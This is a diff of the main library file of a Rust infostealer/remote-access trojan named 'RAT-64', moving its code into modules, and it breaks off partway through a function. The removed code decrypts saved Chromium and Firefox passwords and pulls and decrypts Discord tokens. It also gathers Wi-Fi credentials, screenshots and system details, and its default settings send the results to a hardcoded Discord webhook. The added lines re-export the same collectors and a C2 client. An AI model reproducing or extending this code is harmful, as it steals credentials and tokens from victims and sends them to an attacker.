@@ -1,15 +1,5 @@
-// 標準ライブラリ
-use std::process::Command;
-#[cfg(windows)]
-use std::os::windows::process::CommandExt;
-
-// 外部クレート
+// RAT-64 Library - 整理されたモジュール構造版
 use serde::{Serialize, Deserialize};
-use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
-
-// 条件付きインポート
-#[cfg(feature = "screenshot")]
-use crate::modules::screen_capture::ScreenshotConfig;
 
 // カスタムエラー型の定義
 #[derive(Debug)]
@@ -49,1354 +39,232 @@ impl From<serde_json::Error> for RatError {
 
 pub type RatResult<T> = Result<T, RatError>;
 
-// モジュールシステム
-pub mod modules;
-pub mod browser_profiles;
-pub mod password_manager;
-// CLI関連は削除済み（引数処理不要のため）
-pub mod data_exporter; 
-pub mod firefox_nss;
-// Only include browser collector when the feature is enabled
-#[cfg(feature = "browser")]
-pub mod browser_scanner;
-pub mod auth_tokens;
-// File upload functionality (requires network feature)
-#[cfg(feature = "network")]
-pub mod file_uploader;
+// 整理されたモジュールシステム
+pub mod core;        // 基本設定とコア機能
+pub mod collectors;  // データ収集機能
+pub mod network;     // ネットワーク通信機能
+pub mod utils;       // ユーティリティ機能
+pub mod services;    // バックグラウンドサービス機能
 
-// 新しいモジュールからの公開API
-pub use browser_profiles::{get_profile_path, get_default_profile};
-pub use password_manager::{JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin};
-// Args構造体は削除済み
-// data_exporterは現在未使用
-#[cfg(feature = "network")]
-pub use file_uploader::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
+// modulesディレクトリは削除済み（新しいモジュール構造を使用）
 
-// 最小限のシステム情報構造体
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct SystemInfo {
-    pub hostname: String,
-    pub username: String,
-    pub os_name: String,
-    pub os_version: String,
-    pub os_arch: String,
-    pub cpu_info: String,
-    pub memory_total_gb: f64,
-    pub memory_available_gb: f64,
-    pub disk_info: Vec<DiskInfo>,
-    pub uptime_hours: f64,
-    pub local_ip: String,
-    pub public_ip: Option<String>,
-    pub network_interfaces: Vec<NetworkInterface>,
-    pub timezone: String,
-    pub locale: String,
-}
+// 公開API（新しいモジュール構造に対応）
+pub use core::{Config, load_config_or_default};
+pub use collectors::{
+    SystemInfo, get_system_info, get_system_info_async, DiskInfo, NetworkInterface,
+    AuthData, collect_auth_data_with_config,
+    ScreenshotData, collect_screenshots,
+    get_profile_path, get_default_profile,
+    JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin
+};
+pub use utils::{encrypt_data_with_key, generate_key_pair};
+pub use network::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
+pub use services::{C2Client};
 
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct DiskInfo {
-    pub drive_letter: String,
-    pub file_system: String,
-    pub total_size_gb: f64,
-    pub free_space_gb: f64,
-    pub used_percentage: f64,
-}
-
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct NetworkInterface {
-    pub name: String,
-    pub ip_address: String,
-    pub mac_address: String,
-    pub interface_type: String,
-}
-
-// 最小限の認証データ構造体
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct AuthData {
-    pub passwords: Vec<String>,
-    pub wifi_creds: Vec<String>,
-}
-
-// スクリーンショットデータ構造体
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct ScreenshotData {
-    pub primary_display: Option<String>,      // Base64エンコードされたプライマリディスプレイ
-    pub all_displays: Vec<String>,            // Base64エンコードされた全ディスプレイ
-    pub capture_time: String,                 // キャプチャ時刻
-    pub total_count: usize,                   // 取得したスクリーンショット数
-}
-
-// 統合設定構造体
-#[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct Config {
-    // 基本設定
-    pub collect_auth_data: bool,
-    pub timeout_seconds: u64,
-    
-    // Webhook設定
-    pub webhook_url: String,
-    pub webhook_type: String,
-    pub webhook_enabled: bool,
-    
-    // 収集設定
-    pub collect_screenshots: bool,
-    pub collect_webcam: bool,
-    pub collect_processes: bool,
-    pub collect_software: bool,
-    pub collect_browser_passwords: bool,
-    pub collect_browser_cookies: bool,
-    pub collect_wifi_passwords: bool,
-    pub collect_api_keys: bool,
-    pub collect_ssh_keys: bool,
-    pub collect_firefox_passwords: bool,
-    pub collect_discord_tokens: bool,
-    
-    // モジュール設定
-    pub enabled_modules: Vec<String>,
-    pub execution_order: Vec<String>,
-    pub output_format: String,
-    pub max_execution_time: u64,
-    
-    // 制限設定
-    pub max_processes: u32,
-    pub retry_attempts: u32,
-}
-
-impl Default for Config {
-    fn default() -> Self {
-        let enabled_modules = vec![
-            "network".to_string(),
-            "browser".to_string(),
-            "screenshot".to_string(),
-            "webhook".to_string(),
-        ];
-        
-        Config {
-            // 基本設定
-            collect_auth_data: true,
-            timeout_seconds: 45,
-            
-            // Webhook設定（デフォルトで有効）
-            webhook_url: "https://discordapp.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
-            webhook_type: "Discord".to_string(),
-            webhook_enabled: true,
-            
-            // 収集設定
-            collect_screenshots: true,
-            collect_webcam: false,
-            collect_processes: true,
-            collect_software: true,
-            collect_browser_passwords: true,
-            collect_browser_cookies: false,
-            collect_wifi_passwords: true,
-            collect_api_keys: false,
-            collect_ssh_keys: false,
-            collect_firefox_passwords: true,
-            collect_discord_tokens: true,
-            
-            // モジュール設定
-            enabled_modules: enabled_modules.clone(),
-            execution_order: enabled_modules,
-            output_format: "Encrypted".to_string(),
-            max_execution_time: 240,
-            
-            // 制限設定
-            max_processes: 15,
-            retry_attempts: 2,
-        }
-    }
-}
-
-// OS詳細情報取得
-fn get_os_details() -> (String, String) {
-    #[cfg(windows)]
-    {
-        let version = Command::new("cmd")
-            .args(&["/C", "ver"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .unwrap_or_else(|| "Unknown".to_string())
-            .trim()
-            .to_string();
-        
-        let arch = std::env::consts::ARCH.to_string();
-        (version, arch)
-    }
-    #[cfg(not(windows))]
-    {
-        let version = Command::new("uname")
-            .args(&["-r"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .unwrap_or_else(|| "Unknown".to_string())
-            .trim()
-            .to_string();
-        
-        let arch = std::env::consts::ARCH.to_string();
-        (version, arch)
-    }
-}
-
-// CPU情報取得
-fn get_cpu_info() -> String {
-    #[cfg(windows)]
-    {
-        Command::new("wmic")
-            .args(&["cpu", "get", "name", "/format:value"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .and_then(|s| s.lines().find(|line| line.starts_with("Name=")).map(|line| line[5..].to_string()))
-            .unwrap_or_else(|| "Unknown CPU".to_string())
-    }
-    #[cfg(not(windows))]
-    {
-        std::fs::read_to_string("/proc/cpuinfo")
-            .ok()
-            .and_then(|content| content.lines()
-                .find(|line| line.starts_with("model name"))
-                .map(|line| line.split(':').nth(1).unwrap_or("Unknown").trim().to_string()))
-            .unwrap_or_else(|| "Unknown CPU".to_string())
-    }
-}
-
-// メモリ情報取得
-fn get_memory_info() -> (f64, f64) {
-    #[cfg(windows)]
-    {
-        // より簡単なwmicコマンドを試す
-        let total = Command::new("wmic")
-            .args(&["computersystem", "get", "TotalPhysicalMemory"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .and_then(|s| {
-                for line in s.lines() {
-                    if let Ok(bytes) = line.trim().parse::<u64>() {
-                        if bytes > 1000000 { // 妥当な値かチェック
-                            return Some(bytes as f64 / 1_073_741_824.0);
-                        }
-                    }
-                }
-                None
-            })
-            .unwrap_or_else(|| {
-                // 代替手段: PowerShellを使用
-                Command::new("powershell")
-                    .args(&["-Command", "(Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum"])
-                    .output()
-                    .ok()
-                    .and_then(|output| String::from_utf8(output.stdout).ok())
-                    .and_then(|s| s.trim().parse::<u64>().ok())
-                    .map(|bytes| bytes as f64 / 1_073_741_824.0)
-                    .unwrap_or(16.0) // フォールバック値
-            });
-
-        let available = Command::new("wmic")
-            .args(&["OS", "get", "FreePhysicalMemory"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .and_then(|s| {
-                for line in s.lines() {
-                    if let Ok(kb) = line.trim().parse::<u64>() {
-                        if kb > 100000 { // 妥当な値かチェック
-                            return Some(kb as f64 / 1_048_576.0);
-                        }
-                    }
-                }
-                None
-            })
-            .unwrap_or_else(|| {
-                // 代替手段: PowerShellを使用
-                Command::new("powershell")
-                    .args(&["-Command", "(Get-WmiObject -Class Win32_OperatingSystem).FreePhysicalMemory"])
-                    .output()
-                    .ok()
-                    .and_then(|output| String::from_utf8(output.stdout).ok())
-                    .and_then(|s| s.trim().parse::<u64>().ok())
-                    .map(|kb| kb as f64 / 1_048_576.0)
-                    .unwrap_or(8.0) // フォールバック値
-            });
-
-        (total, available)
-    }
-    #[cfg(not(windows))]
-    {
-        let meminfo = std::fs::read_to_string("/proc/meminfo").unwrap_or_default();
-        let total = meminfo.lines()
-            .find(|line| line.starts_with("MemTotal:"))
-            .and_then(|line| line.split_whitespace().nth(1))
-            .and_then(|s| s.parse::<u64>().ok())
-            .map(|kb| kb as f64 / 1_048_576.0)
-            .unwrap_or(0.0);
-
-        let available = meminfo.lines()
-            .find(|line| line.starts_with("MemAvailable:"))
-            .and_then(|line| line.split_whitespace().nth(1))
-            .and_then(|s| s.parse::<u64>().ok())
-            .map(|kb| kb as f64 / 1_048_576.0)
-            .unwrap_or(0.0);
-
-        (total, available)
-    }
-}
-
-// ディスク情報取得
-fn get_disk_info() -> Vec<DiskInfo> {
-    let mut disks = Vec::new();
-    
-    #[cfg(windows)]
-    {
-        // より簡単なwmicコマンドを試す
-        if let Ok(output) = Command::new("wmic")
-            .args(&["logicaldisk", "get", "size,freespace,filesystem,deviceid"])
-            .output()
-        {
-            if let Ok(output_str) = String::from_utf8(output.stdout) {
-                let lines: Vec<&str> = output_str.lines().collect();
-                
-                // ヘッダー行をスキップし、データ行を処理
-                for line in lines.iter().skip(1) {
-                    let parts: Vec<&str> = line.split_whitespace().collect();
-                    if parts.len() >= 4 && parts[0].ends_with(':') {
-                        if let (Ok(free_space), Ok(total_size)) = (
-                            parts[2].parse::<u64>(),
-                            parts[3].parse::<u64>()
-                        ) {
-                            if total_size > 0 {
-                                let total_gb = total_size as f64 / 1_073_741_824.0;
-                                let free_gb = free_space as f64 / 1_073_741_824.0;
-                                let used_percentage = ((total_size - free_space) as f64 / total_size as f64) * 100.0;
-                                
-                                disks.push(DiskInfo {
-                                    drive_letter: parts[0].to_string(),
-                                    file_system: parts[1].to_string(),
-                                    total_size_gb: total_gb,
-                                    free_space_gb: free_gb,
-                                    used_percentage,
-                                });
-                            }
-                        }
-                    }
-                }
-            }
-        }
-        
-        // 代替手段: PowerShellを使用
-        if disks.is_empty() {
-            if let Ok(output) = Command::new("powershell")
-                .args(&["-Command", "Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FileSystem, Size, FreeSpace | ConvertTo-Csv -NoTypeInformation"])
-                .output()
-            {
-                if let Ok(output_str) = String::from_utf8(output.stdout) {
-                    for line in output_str.lines().skip(1) { // Skip header
-                        let parts: Vec<&str> = line.trim_matches('"').split("\",\"").collect();
-                        if parts.len() >= 4 {
-                            if let (Ok(total_size), Ok(free_space)) = (
-                                parts[2].parse::<u64>(),
-                                parts[3].parse::<u64>()
-                            ) {
-                                if total_size > 0 {
-                                    let total_gb = total_size as f64 / 1_073_741_824.0;
-                                    let free_gb = free_space as f64 / 1_073_741_824.0;
-                                    let used_percentage = ((total_size - free_space) as f64 / total_size as f64) * 100.0;
-                                    
-                                    disks.push(DiskInfo {
-                                        drive_letter: parts[0].to_string(),
-                                        file_system: parts[1].to_string(),
-                                        total_size_gb: total_gb,
-                                        free_space_gb: free_gb,
-                                        used_percentage,
-                                    });
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    if disks.is_empty() {
-        disks.push(DiskInfo {
-            drive_letter: "C:".to_string(),
-            file_system: "NTFS".to_string(),
-            total_size_gb: 1000.0, // フォールバック値
-            free_space_gb: 500.0,   // フォールバック値  
-            used_percentage: 50.0,   // フォールバック値
-        });
-    }
-    
-    disks
-}
-
-// システム稼働時間取得
-fn get_uptime_hours() -> f64 {
-    #[cfg(windows)]
-    {
-        Command::new("wmic")
-            .args(&["os", "get", "lastbootuptime", "/format:value"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .and_then(|s| s.lines()
-                .find(|line| line.starts_with("LastBootUpTime="))
-                .map(|_| 0.0)) // 簡略化: 実際の計算は複雑
-            .unwrap_or(0.0)
-    }
-    #[cfg(not(windows))]
-    {
-        std::fs::read_to_string("/proc/uptime")
-            .ok()
-            .and_then(|content| content.split_whitespace().next())
-            .and_then(|s| s.parse::<f64>().ok())
-            .map(|seconds| seconds / 3600.0)
-            .unwrap_or(0.0)
-    }
-}
-
-// パブリックIP取得
-fn get_public_ip() -> Option<String> {
-    // HTTP リクエストなしで None を返す
-    None
-}
-
-// ネットワークインターフェース情報取得
-fn get_network_interfaces() -> Vec<NetworkInterface> {
-    let mut interfaces = Vec::new();
-    
-    #[cfg(windows)]
-    {
-        if let Ok(output) = Command::new("ipconfig")
-            .args(&["/all"])
-            .output()
-        {
-            if let Ok(_output_str) = String::from_utf8(output.stdout) {
-                // 簡略化: 基本的なパース
-                interfaces.push(NetworkInterface {
-                    name: "Ethernet".to_string(),
-                    ip_address: "192.168.1.100".to_string(),
-                    mac_address: "00:00:00:00:00:00".to_string(),
-                    interface_type: "Ethernet".to_string(),
-                });
-            }
-        }
-    }
-    
-    if interfaces.is_empty() {
-        interfaces.push(NetworkInterface {
-            name: "Unknown".to_string(),
-            ip_address: "0.0.0.0".to_string(),
-            mac_address: "00:00:00:00:00:00".to_string(),
-            interface_type: "Unknown".to_string(),
-        });
-    }
-    
-    interfaces
-}
-
-// タイムゾーン取得
-fn get_timezone() -> String {
-    #[cfg(windows)]
-    {
-        Command::new("tzutil")
-            .args(&["/g"])
-            .output()
-            .ok()
-            .and_then(|output| String::from_utf8(output.stdout).ok())
-            .map(|s| s.trim().to_string())
-            .unwrap_or_else(|| "UTC".to_string())
-    }
-    #[cfg(not(windows))]
-    {
-        std::env::var("TZ").unwrap_or_else(|_| "UTC".to_string())
-    }
-}
-
-// ロケール取得
-fn get_locale() -> String {
-    std::env::var("LANG")
-        .or_else(|_| std::env::var("LC_ALL"))
-        .unwrap_or_else(|_| "en_US.UTF-8".to_string())
-}
-
-// 詳細システム情報収集（統合版）
-pub fn get_system_info() -> RatResult<SystemInfo> {
-    let hostname = whoami::fallible::hostname()
-        .map_err(|_| RatError::Command("Failed to get hostname".to_owned()))?;
-    let username = std::env::var("USERNAME")
-        .or_else(|_| std::env::var("USER"))
-        .unwrap_or_else(|_| "Unknown".to_owned());
-    let os_name = std::env::consts::OS.to_owned();
-    let local_ip = local_ipaddress::get()
-        .unwrap_or_else(|| "Unknown".to_owned());
-
-    // OS詳細情報
-    let (os_version, os_arch) = get_os_details();
-    let cpu_info = get_cpu_info();
-    let (memory_total_gb, memory_available_gb) = get_memory_info();
-    let disk_info = get_disk_info();
-    let uptime_hours = get_uptime_hours();
-    let public_ip = get_public_ip();
-    let network_interfaces = get_network_interfaces();
-    let timezone = get_timezone();
-    let locale = get_locale();
-
-    Ok(SystemInfo {
-        hostname,
-        username,
-        os_name,
-        os_version,
-        os_arch,
-        cpu_info,
-        memory_total_gb,
-        memory_available_gb,
-        disk_info,
-        uptime_hours,
-        local_ip,
-        public_ip,
-        network_interfaces,
-        timezone,
-        locale,
-    })
-}
-
-// 認証データ収集（統合版）
-pub fn collect_auth_data() -> AuthData {
-    collect_auth_data_with_config(&Config::default())
-}
-
-pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
-    // 並列処理を順次処理に変更（標準ライブラリ版）
-    let passwords = collect_all_passwords(config);
-    let wifi_creds = if config.collect_wifi_passwords { 
-        collect_wifi_credentials() 
-    } else { 
-        Vec::new() 
-    };
-
-    AuthData { passwords, wifi_creds }
-}
-
-// 全パスワード収集（統合版）
-fn collect_all_passwords(config: &Config) -> Vec<String> {
-    let mut passwords = Vec::with_capacity(256);
-    
-    if config.collect_browser_passwords {
-        passwords.extend(collect_browser_passwords());
-    }
-    
-    if config.collect_discord_tokens {
-        match extract_discord_tokens() {
-            Ok(tokens) => passwords.extend(tokens),
-            Err(_) => passwords.push("Discord token extraction failed".to_string()),
-        }
-    }
-    
-    passwords
-}
-
-// ブラウザパスワード収集（統合最適化版 - chromium_dump統合）
-#[cfg(feature = "browser")]
-fn collect_browser_passwords() -> Vec<String> {
-    let mut all_passwords = Vec::new();
-    
-    // 統合ブラウザデータ収集機能を使用（ChromiumとFirefox両方対応）
-    match crate::browser_scanner::collect_browser_passwords_simple() {
-        Ok(passwords) => {
-            println!("🔍 Browser scan found {} entries", passwords.len());
-            all_passwords.extend(passwords);
-        }
-        Err(e) => {
-            println!("❌ Browser password collection failed: {}", e);
-            all_passwords.push(format!("Browser collection error: {}", e));
-        }
-    }
-    
-    // Firefox専用の追加収集（NSS復号化）
-    match collect_firefox_passwords_direct() {
-        Ok(mut firefox_passwords) => {
-            println!("🦊 Firefox scan found {} entries", firefox_passwords.len());
-            all_passwords.append(&mut firefox_passwords);
-        }
-        Err(e) => {
-            println!("⚠️ Firefox collection warning: {}", e);
-        }
-    }
-    
-    // Chrome/Edge専用の追加収集（DPAPI復号化）
-    match collect_chromium_passwords_direct() {
-        Ok(mut chrome_passwords) => {
-            println!("🌐 Chromium scan found {} entries", chrome_passwords.len());
-            all_passwords.append(&mut chrome_passwords);
-        }
-        Err(e) => {
-            println!("⚠️ Chromium collection warning: {}", e);
-        }
-    }
-    
-    if all_passwords.is_empty() {
-        vec!["No browser passwords found in any browser".to_string()]
-    } else {
-        println!("✅ Total browser passwords collected: {}", all_passwords.len());
-        all_passwords
-    }
-}
-
-#[cfg(not(feature = "browser"))]
-fn collect_browser_passwords() -> Vec<String> {
-    vec!["Browser feature not enabled".to_string()]
-}
-
-// 追加のFirefox専用パスワード収集
-#[cfg(feature = "browser")]
-fn collect_firefox_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    use crate::password_manager::NssCredentials;
-    
-    let mut passwords = Vec::new();
-    
-    // Firefox プロファイルを自動検出
-    match get_firefox_profiles() {
-        Ok(profiles) => {
-            for profile_path in profiles {
-                let nss = NssCredentials::new(profile_path);
-                match nss.get_decrypted_logins() {
-                    Ok(creds) => {
-                        for cred in creds {
-                            passwords.push(format!(
-                                "Firefox - {}: {} / {}",
-                                cred.hostname, cred.username, cred.password
-                            ));
-                        }
-                    }
-                    Err(_) => continue,
-                }
-            }
-        }
-        Err(e) => return Err(e),
-    }
-    
-    Ok(passwords)
-}
-
-// 追加のChromium専用パスワード収集
-#[cfg(feature = "browser")]
-fn collect_chromium_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    let mut passwords = Vec::new();
-    
-    // Chrome/Edge プロファイルを直接スキャン
-    let chrome_paths = get_chromium_profiles()?;
-    
-    for profile_path in chrome_paths {
-        let login_data = profile_path.join("Login Data");
-        if login_data.exists() {
-            match extract_chromium_passwords_from_db(&login_data) {
-                Ok(mut creds) => passwords.append(&mut creds),
-                Err(_) => continue,
-            }
-        }
-    }
-    
-    Ok(passwords)
-}
-
-// Firefox プロファイル取得
-#[cfg(feature = "browser")]
-fn get_firefox_profiles() -> Result<Vec<std::path::PathBuf>, Box<dyn std::error::Error>> {
-    let mut profiles = Vec::new();
-    
-    if let Some(appdata) = std::env::var_os("APPDATA") {
-        let firefox_dir = std::path::PathBuf::from(appdata)
-            .join("Mozilla")
-            .join("Firefox")
-            .join("Profiles");
-        
-        if firefox_dir.exists() {
-            for entry in std::fs::read_dir(firefox_dir)? {
-                let entry = entry?;
-                if entry.file_type()?.is_dir() {
-                    profiles.push(entry.path());
-                }
-            }
-        }
-    }
-    
-    Ok(profiles)
-}
-
-// Chromium プロファイル取得
-#[cfg(feature = "browser")]
-fn get_chromium_profiles() -> Result<Vec<std::path::PathBuf>, Box<dyn std::error::Error>> {
-    let mut profiles = Vec::new();
-    
-    if let Some(local_appdata) = std::env::var_os("LOCALAPPDATA") {
-        let browsers = [
-            "Google\\Chrome\\User Data\\Default",
-            "Microsoft\\Edge\\User Data\\Default",
-            "BraveSoftware\\Brave-Browser\\User Data\\Default",
-        ];
-        
-        for browser_path in browsers.iter() {
-            let profile_path = std::path::PathBuf::from(&local_appdata).join(browser_path);
-            if profile_path.exists() {
-                profiles.push(profile_path);
-            }
-        }
-    }
-    
-    Ok(profiles)
-}
-
-// Chromiumデータベースから直接パスワード抽出
-#[cfg(feature = "browser")]
-fn extract_chromium_passwords_from_db(login_data_path: &std::path::Path) -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    use rusqlite::Connection;
-    use std::fs;
-    
-    // データベースファイルをコピー（ロック回避）
-    let temp_file = tempfile::NamedTempFile::new()?;
-    fs::copy(login_data_path, temp_file.path())?;
-    
-    let conn = Connection::open(temp_file.path())?;
-    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
-    
-    let mut passwords = Vec::new();
-    let rows = stmt.query_map([], |row| {
-        Ok((
-            row.get::<_, String>(0)?,  // origin_url
-            row.get::<_, String>(1)?,  // username_value  
-            row.get::<_, Vec<u8>>(2)?, // password_value (encrypted)
-        ))
-    })?;
-    
-    for row in rows {
-        if let Ok((url, username, encrypted_password)) = row {
-            if !username.is_empty() && !encrypted_password.is_empty() {
-                // DPAPI復号化を試行
-                match decrypt_with_dpapi(&encrypted_password) {
-                    Ok(decrypted_password) => {
-                        passwords.push(format!("Chromium - {}: {} / {}", url, username, decrypted_password));
-                    }
-                    Err(_) => {
-                        passwords.push(format!("Chromium - {}: {} / [ENCRYPTED]", url, username));
-                    }
-                }
-            }
-        }
-    }
-    
-    Ok(passwords)
-}
-
-// DPAPI復号化
-#[cfg(all(feature = "browser", windows))]
-fn decrypt_with_dpapi(encrypted_data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
-    use winapi::um::dpapi::CryptUnprotectData;
-    use winapi::um::winbase::LocalFree;
-    use winapi::um::wincrypt::DATA_BLOB;
-    use std::ptr;
-    
-    if encrypted_data.len() < 16 {
-        return Err("Invalid encrypted data length".into());
-    }
-    
-    // Chrome v80+のプレフィックスをチェック
-    if encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
-        return Err("Chrome v80+ encryption not supported in DPAPI mode".into());
-    }
-    
-    let mut input_blob = DATA_BLOB {
-        cbData: encrypted_data.len() as u32,
-        pbData: encrypted_data.as_ptr() as *mut u8,
-    };
-    
-    let mut output_blob = DATA_BLOB {
-        cbData: 0,
-        pbData: ptr::null_mut(),
-    };
-    
-    let success = unsafe {
-        CryptUnprotectData(
-            &mut input_blob,
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
-            0,
-            &mut output_blob,
-        )
-    };
-    
-    if success == 0 {
-        return Err("DPAPI decryption failed".into());
-    }
-    
-    let result = unsafe {
-        let slice = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
-        String::from_utf8_lossy(slice).to_string()
-    };
-    
-    unsafe {
-        LocalFree(output_blob.pbData as *mut _);
-    }
-    
-    Ok(result)
-}
-
-#[cfg(not(all(feature = "browser", windows)))]
-fn decrypt_with_dpapi(_encrypted_data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
-    Err("DPAPI not available on this platform".into())
-}
-
-#[cfg(not(feature = "browser"))]
-fn collect_firefox_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    Err("Browser feature not enabled".into())
-}
-
-#[cfg(not(feature = "browser"))]
-fn collect_chromium_passwords_direct() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    Err("Browser feature not enabled".into())
-}
-
-// Discord トークン収集統合版（token_dump.rs機能統合）
-fn extract_discord_tokens() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    let mut tokens = Vec::new();
-    
-    if !cfg!(windows) {
-        return Ok(tokens);
-    }
-    
-    // Discord自動検出＆トークン復号化
-    match extract_discord_tokens_advanced() {
-        Ok(decrypted_tokens) => {
-            let token_count = decrypted_tokens.len();
-            if token_count == 0 {
-                tokens.push("Discord統合モジュール: トークンは見つかりませんでした".to_string());
-            } else {
-                tokens.extend(decrypted_tokens);
-                tokens.push(format!("✅ Discord統合モジュール: {}個のトークンを復号化", token_count));
-            }
-        },
-        Err(e) => {
-            tokens.push(format!("⚠️ Discord統合モジュール: {}", e));
-            
-            // フォールバック: 従来の検索
-            if let Ok(user) = std::env::var("USERPROFILE") {
-                let discord_paths = vec![
-                    format!("{}\\AppData\\Roaming\\discord\\Local Storage\\leveldb", user),
-                    format!("{}\\AppData\\Roaming\\Discord\\Local Storage\\leveldb", user),
-                ];
-                
-                for path in discord_paths {
-                    if std::path::Path::new(&path).exists() {
-                        tokens.push(format!("Discord directory found: {}", path));
-                    }
-                }
-            }
-        }
-    }
-    
-    if tokens.is_empty() {
-        tokens.push("No Discord installation found".to_string());
-    }
-    
-    Ok(tokens)
-}
-
-// 高度なDiscordトークン抽出機能（token_dump.rs統合版）
-#[cfg(windows)]
-fn extract_discord_tokens_advanced() -> Result<Vec<String>, Box<dyn std::error::Error>> {
-    use std::{ptr, ffi::c_void, fs};
-    use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
-    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
-    
-    // Windows DPAPI FFI
-    #[link(name = "crypt32")]
-    extern "system" {
-        fn CryptUnprotectData(
-            pDataIn: *const DataBlob,
-            ppszDataDescr: *mut *mut u16,
-            pOptionalEntropy: *const DataBlob,
-            pvReserved: *mut c_void,
-            pPromptStruct: *mut c_void,
-            dwFlags: u32,
-            pDataOut: *mut DataBlob,
-        ) -> i32;
-    }
-    
-    #[link(name = "kernel32")]
-    extern "system" {
-        fn LocalFree(hMem: *mut c_void) -> *mut c_void;
-    }
-    
-    #[repr(C)]
-    struct DataBlob {
-        cb_data: u32,
-        pb_data: *mut u8,
-    }
-    
-    // DPAPI復号関数
-    fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-        unsafe {
-            let in_blob = DataBlob {
-                cb_data: data.len() as u32,
-                pb_data: data.as_ptr() as *mut u8,
-            };
-            let mut out_blob = DataBlob {
-                cb_data: 0,
-                pb_data: ptr::null_mut(),
-            };
-            
-            let result = CryptUnprotectData(
-                &in_blob,
-                ptr::null_mut(),
-                ptr::null(),
-                ptr::null_mut(),
-                ptr::null_mut(),
-                1, // CRYPTPROTECT_UI_FORBIDDEN
-                &mut out_blob,
-            );
-            
-            if result != 0 {
-                let slice = std::slice::from_raw_parts(out_blob.pb_data, out_blob.cb_data as usize);
-                let decrypted_data = slice.to_vec();
-                LocalFree(out_blob.pb_data as *mut c_void);
-                Ok(decrypted_data)
-            } else {
-                Err("DPAPI decryption failed".into())
-            }
-        }
-    }
-    
-    // Discord自動検出（標準ライブラリ使用）
-    let config_dir = get_config_dir()?;
-    let discord_path = config_dir.join("discord");
-    
-    if !discord_path.exists() {
-        return Err("Discord directory not found".into());
-    }
-    
-    // Local State読み込み
-    let local_state_path = discord_path.join("Local State");
-    if !local_state_path.exists() {
-        return Err("Discord Local State not found".into());
-    }
-    
-    let json = fs::read_to_string(&local_state_path)?;
-    let v: serde_json::Value = serde_json::from_str(&json)?;
-    let enc_key_b64 = v["os_crypt"]["encrypted_key"]
-        .as_str()
-        .ok_or("Encrypted key not found")?;
-    
-    let enc_key = BASE64.decode(enc_key_b64)?;
-    if !enc_key.starts_with(b"DPAPI") {
-        return Err("Invalid key format".into());
-    }
-    
-    let master_key = dpapi_unprotect(&enc_key[5..])?;
-    
-    // LDBファイル検索
-    let leveldb_path = discord_path.join("Local Storage").join("leveldb");
-    if !leveldb_path.exists() {
-        return Err("LevelDB directory not found".into());
-    }
-    
-    let mut tokens = Vec::new();
-    let entries = fs::read_dir(&leveldb_path)?;
-    
-    for entry in entries {
-        let entry = entry?;
-        let path = entry.path();
-        
-        if path.extension().map_or(false, |ext| ext == "ldb") {
-            if let Ok(data) = fs::read(&path) {
-                let content = String::from_utf8_lossy(&data);
-                
-                // トークン検索
-                let pattern = "dQw4w9WgXcQ:";
-                let mut start = 0;
-                
-                while let Some(pos) = content[start..].find(pattern) {
-                    let token_start = start + pos + pattern.len();
-                    let remaining = &content[token_start..];
-                    
-                    let token_end = remaining
-                        .find(|c: char| c == '"' || c == '\0' || c == '\n' || c.is_control())
-                        .unwrap_or(remaining.len());
-                    
-                    if token_end > 20 {
-                        let encrypted = &remaining[..token_end];
-                        
-                        // AES復号化
-                        if let Ok(data) = BASE64.decode(encrypted) {
-                            if data.len() >= 31 && data.starts_with(b"v10") {
-                                let iv = &data[3..15];
-                                let ciphertext = &data[15..data.len() - 16];
-                                let tag = &data[data.len() - 16..];
-                                
-                                if let Ok(cipher) = Aes256Gcm::new_from_slice(&master_key) {
-                                    let mut payload = ciphertext.to_vec();
-                                    payload.extend_from_slice(tag);
-                                    let nonce = Nonce::from_slice(iv);
-                                    
-                                    if let Ok(plaintext) = cipher.decrypt(nonce, payload.as_ref()) {
-                                        let token = String::from_utf8_lossy(&plaintext);
-                                        tokens.push(format!("Discord Token: {}", token));
-                                    }
-                                }
-                            }
